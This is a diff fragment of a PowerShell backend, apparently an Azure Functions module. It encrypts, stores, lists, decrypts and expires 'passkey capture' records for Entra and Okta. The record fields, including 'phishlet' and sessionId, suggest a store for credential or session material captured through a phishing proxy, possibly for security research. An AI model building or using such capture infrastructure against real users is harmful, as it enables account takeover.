+    return @($response.value | ForEach-Object { $status=[string]$_.Status;if((Get-Date).ToUniversalTime() -ge [datetime]$_.ExpiresAt){$status='expired'};[ordered]@{ recordId=$_.PartitionKey; captureId=$_.RowKey; provider=$_.Provider; event=$_.Event; phishlet=$_.Phishlet; sessionId=$_.SessionId; trigger=$_.Trigger; capturedAt=$_.CapturedAt; receivedAt=$_.ReceivedAt; expiresAt=$_.ExpiresAt; status=$status; payloadSha256=$_.PayloadSha256; encryptedBlobName=$_.EncryptedBlobName; cekSecretName=$_.CekSecretName } })
+}
+
+function Export-PasskeyCapturePayload {
+    param([Parameter(Mandatory)][hashtable]$Configuration,[Parameter(Mandatory)][System.Collections.IDictionary]$Context)
+    if ((Get-Date).ToUniversalTime() -ge [datetime]$Context.expiresAt) { throw [TimeoutException]::new('Capture context has expired.') }
+    $cek = [Convert]::FromBase64String((Get-PasskeyKeyVaultSecret -Configuration $Configuration -Name ([string]$Context.cekSecretName)))
+    $headers = @{ Authorization = "Bearer $(Get-StorageAccessToken -Configuration $Configuration)"; 'x-ms-version'='2023-11-03'; 'x-ms-date'=(Get-Date).ToUniversalTime().ToString('R') }
+    $envelope = Invoke-RestMethod -Method GET -Uri "$(Get-StorageBlobServiceUri)/$(Get-PasskeyCaptureContainerName)/$($Context.encryptedBlobName)" -Headers $headers
+    $nonce=[Convert]::FromBase64String($envelope.nonce); $cipher=[Convert]::FromBase64String($envelope.ciphertext); $tag=[Convert]::FromBase64String($envelope.tag)
+    $plain=[byte[]]::new($cipher.Length); $aad=[Text.Encoding]::UTF8.GetBytes("passkey-capture:v1:$($Context.provider):$($Context.captureId)")
+    $aes=[Security.Cryptography.AesGcm]::new($cek,16)
+    try { $aes.Decrypt($nonce,$cipher,$tag,$plain,$aad) } finally { $aes.Dispose() }
+    return [Text.Encoding]::UTF8.GetString($plain) | ConvertFrom-Json -AsHashtable -Depth 50
+}
+
+function Protect-PasskeyQueuedCapture {
+    param([Parameter(Mandatory)][hashtable]$Configuration,[Parameter(Mandatory)][ValidateSet('entra','okta')][string]$Provider,[Parameter(Mandatory)][hashtable]$Body,[Parameter(Mandatory)][string]$RequestId)
+    $raw=[Text.Encoding]::UTF8.GetBytes(($Body | ConvertTo-Json -Depth 50 -Compress)); $max=1048576
+    [void][int]::TryParse([Environment]::GetEnvironmentVariable('PASSKEY_CAPTURE_MAX_BYTES'),[ref]$max)
+    if($raw.Length -gt $max){throw [System.ArgumentException]::new("Capture payload exceeds the configured $max-byte limit.")}
+    $captureId=Get-DeterministicPasskeyRecordId -Name "passkey-queue-capture:${Provider}:${RequestId}"
+    $cek=[byte[]]::new(32);[Security.Cryptography.RandomNumberGenerator]::Fill($cek);$nonce=[byte[]]::new(12);[Security.Cryptography.RandomNumberGenerator]::Fill($nonce)
+    $cipher=[byte[]]::new($raw.Length);$tag=[byte[]]::new(16);$aad=[Text.Encoding]::UTF8.GetBytes("passkey-capture:v1:${Provider}:${captureId}")
+    $aes=[Security.Cryptography.AesGcm]::new($cek,16);try{$aes.Encrypt($nonce,$raw,$cipher,$tag,$aad)}finally{$aes.Dispose()}
+    $expires=(Get-Date).ToUniversalTime().AddHours(24);$secretName="pkcek-$captureId"
+    Set-PasskeyKeyVaultSecret -Configuration $Configuration -Name $secretName -Value ([Convert]::ToBase64String($cek)) -ContentType 'application/vnd.research-passkeys.capture-key' -ExpiresAt $expires -Tags @{requestId=$RequestId;captureId=$captureId;kind='queued-capture-key'}
+    Ensure-PasskeyCaptureResources -Configuration $Configuration;$blobName="pending/$RequestId/$captureId.json"
+    $envelope=@{schemaVersion='1';algorithm='A256GCM';nonce=[Convert]::ToBase64String($nonce);ciphertext=[Convert]::ToBase64String($cipher);tag=[Convert]::ToBase64String($tag)}|ConvertTo-Json -Compress
+    $headers=@{Authorization="Bearer $(Get-StorageAccessToken -Configuration $Configuration)";'x-ms-version'='2023-11-03';'x-ms-date'=(Get-Date).ToUniversalTime().ToString('R');'x-ms-blob-type'='BlockBlob'}
+    Invoke-WebRequest -Method PUT -Uri "$(Get-StorageBlobServiceUri)/$(Get-PasskeyCaptureContainerName)/$blobName" -Headers $headers -ContentType 'application/json' -Body $envelope|Out-Null
+    return [ordered]@{provider=$Provider;captureId=$captureId;expiresAt=$expires.ToString('o');encryptedBlobName=$blobName;cekSecretName=$secretName}
+}
+
+function Test-DevelopmentSecretExportEnabled {
+    return [Environment]::GetEnvironmentVariable('PASSKEY_DEPLOYMENT_PROFILE') -eq 'development' -and [Environment]::GetEnvironmentVariable('PASSKEY_ENABLE_DEV_SECRET_EXPORT') -eq 'true'
+}
+
+function Remove-ExpiredPasskeyCaptureProvenance {
+    param([Parameter(Mandatory)][hashtable]$Configuration)
+    $days=90;[void][int]::TryParse([Environment]::GetEnvironmentVariable('PASSKEY_CAPTURE_PROVENANCE_DAYS'),[ref]$days);if($days -lt 1){$days=90}
+    Ensure-PasskeyCaptureResources -Configuration $Configuration
+    $response=Invoke-RestMethod -Method GET -Uri "$(Get-StorageTableServiceUri)/$(Get-PasskeyCaptureTableName)()" -Headers (Get-StorageTableHeaders -Configuration $Configuration)
+    $cutoff=(Get-Date).ToUniversalTime().AddDays(-$days);$deleted=0
+    foreach($entity in @($response.value)){
+        $received=[datetime]::MinValue;if(-not [datetime]::TryParse([string]$entity.ReceivedAt,[ref]$received)){continue};if($received.ToUniversalTime() -ge $cutoff){continue}
+        $uri="$(Get-StorageTableServiceUri)/$(Get-PasskeyCaptureTableName)(PartitionKey='$($entity.PartitionKey)',RowKey='$($entity.RowKey)')"
+        $headers=Get-StorageTableHeaders -Configuration $Configuration;$headers['If-Match']='*'
+        Invoke-WebRequest -Method DELETE -Uri $uri -Headers $headers|Out-Null;$deleted++
+    }
+    return $deleted
+}
+
 function New-JsonHttpResponse {
     param(
         [Parameter(Mandatory)]
         [HttpStatusCode]$StatusCode,
 
         [Parameter(Mandatory)]
-        $Body
+        $Body,
+
+        [Parameter()]
+        [switch]$NoStore
     )
 
     $response = @{
@@ -900,6 +1491,10 @@ function New-JsonHttpResponse {
             'Content-Type' = 'application/json'
         }
         Body = ($Body | ConvertTo-Json -Depth 20)
+    }
+    if ($NoStore) {
+        $response.Headers['Cache-Control'] = 'no-store'
+        $response.Headers['Pragma'] = 'no-cache'
     }
 
     if ('HttpResponseContext' -as [type]) {
